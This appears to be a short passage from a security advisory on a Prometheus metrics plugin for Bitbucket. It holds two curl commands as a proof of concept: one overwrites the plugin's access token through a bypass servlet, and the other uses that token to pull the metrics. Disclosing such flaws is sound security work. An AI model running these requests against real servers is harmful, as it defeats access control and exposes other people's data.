...
```
curl -X POST -d "token=TRUSTWAVE&delay=1" http://localhost:7990/bitbucket/plugins/servlet/promforbitbucket/token/bypass
```

Once this value is overwritten, the prometheus metrics can be retrieved by submitting the following HTTP GET request:

```
curl -X GET "http://localhost:7990/bitbucket/plugins/servlet/prometheus/metrics?token=TRUSTWAVE"
```
